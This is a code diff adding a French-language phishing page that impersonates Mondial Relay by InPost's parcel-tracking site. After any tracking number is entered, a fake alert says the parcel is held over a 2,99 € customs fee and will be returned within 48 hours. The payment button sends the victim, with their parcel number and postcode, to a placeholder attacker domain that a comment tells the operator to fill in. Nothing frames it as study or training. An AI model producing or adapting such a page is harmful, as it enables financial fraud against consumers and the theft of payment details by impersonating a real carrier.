@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Suivi de colis - Mondial Relay by InPost</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+body{background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column}
+.header{background:#E2001A;padding:16px 20px;display:flex;align-items:center;justify-content:space-between}
+.header div{font-weight:700;color:#fff;font-size:1.2rem}
+.nav a{color:#fff;text-decoration:none;margin-left:20px;font-size:0.9rem}
+.main{flex:1;display:flex;justify-content:center;padding:40px 20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08);max-width:520px;width:100%;padding:40px}
+h1{color:#E2001A;font-size:1.8rem;margin-bottom:8px}
+.sub{color:#666;font-size:0.95rem;margin-bottom:30px}
+.form-group{margin-bottom:20px}
+label{display:block;font-size:0.85rem;color:#444;font-weight:600;margin-bottom:6px}
+input{width:100%;padding:14px;border:1.5px solid #ddd;border-radius:6px;font-size:1rem;transition:border-color .2s}
+input:focus{outline:none;border-color:#E2001A}
+.info{font-size:0.8rem;color:#888;margin-top:6px;display:flex;align-items:center;gap:6px}
+.btn{background:#E2001A;color:#fff;border:none;padding:16px;width:100%;border-radius:6px;font-size:1.05rem;font-weight:600;cursor:pointer;margin-top:10px}
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:9999;justify-content:center;align-items:center}
+.overlay-box{background:#fff;padding:35px;border-radius:10px;max-width:420px;width:90%;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,0.3)}
+.ov-icon{width:65px;height:65px;background:#E2001A;border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px;font-weight:700}
+.ov-title{color:#E2001A;font-size:1.3rem;margin-bottom:10px}
+.ov-text{color:#555;font-size:0.95rem;line-height:1.6;margin-bottom:8px}
+.ov-price{font-size:1.6rem;font-weight:700;color:#E2001A;margin:12px 0}
+.ov-btn{background:#E2001A;color:#fff;border:none;padding:14px 28px;border-radius:6px;font-size:1rem;font-weight:600;cursor:pointer;width:100%;margin-top:15px}
+.ov-small{font-size:0.75rem;color:#999;margin-top:12px}
+.footer{text-align:center;padding:20px;font-size:0.75rem;color:#999}
+</style>
+</head>
+<body>
+<div class="header">
+  <div>Mondial Relay <span style="font-weight:400">by</span> InPost</div>
+  <div class="nav"><a href="#">Accueil</a><a href="#">Suivi</a></div>
+</div>
+<div class="main">
+  <div class="card">
+    <h1>Suivre un colis</h1>
+    <p class="sub">Entrez les informations de votre colis pour consulter son statut.</p>
+    <form id="trackForm" onsubmit="handleTrack(event)">
+      <div class="form-group">
+        <label>Numéro de colis</label>
+        <input type="text" id="parcel" placeholder="ex : 76434219" maxlength="20" inputmode="numeric" required>
+        <p class="info">Votre numéro de colis est composé de 8 chiffres.</p>
+      </div>
+      <div class="form-group">
+        <label>Code postal du destinataire</label>
+        <input type="text" id="zip" placeholder="ex : 59650" maxlength="5" inputmode="numeric" required>
+      </div>
+      <button type="submit" class="btn">Rechercher</button>
+    </form>
+  </div>
+</div>
+<div class="footer">Mondial Relay - Service de livraison de colis. Tous droits réservés.</div>
+
+<div class="overlay" id="ov">
+  <div class="overlay-box">
+    <div class="ov-icon">!</div>
+    <div class="ov-title">Colis bloqué en centre de tri</div>
+    <p class="ov-text">Votre colis <strong id="ov-ref"></strong> est retenu pour régularisation des frais de dédouanement.</p>
+    <p class="ov-text" style="font-size:0.85rem">Sans régularisation sous 48 heures, votre colis sera retourné à l'expéditeur.</p>
+    <div class="ov-price">2,99 €</div>
+    <button class="ov-btn" onclick="goPay()">Payer et débloquer mon colis</button>
+    <p class="ov-small">Paiement sécurisé par notre partenaire bancaire.</p>
+  </div>
+</div>
+
+<script>
+function handleTrack(e){
+  e.preventDefault();
+  var p=document.getElementById('parcel').value.trim();
+  if(p.length>=6){
+    document.getElementById('ov-ref').textContent=p;
+    document.getElementById('ov').style.display='flex';
+  }
+}
+function goPay(){
+  var p=document.getElementById('parcel').value.trim();
+  var z=document.getElementById('zip').value.trim();
+  // REMPLACE ICI PAR TON DOMAINE WORKER
+  window.location.href='https://TON-DOMAINE-WORKER/payer?ref='+encodeURIComponent(p)+'&cp='+encodeURIComponent(z);
+}
+</script>
+</body>
+</html>
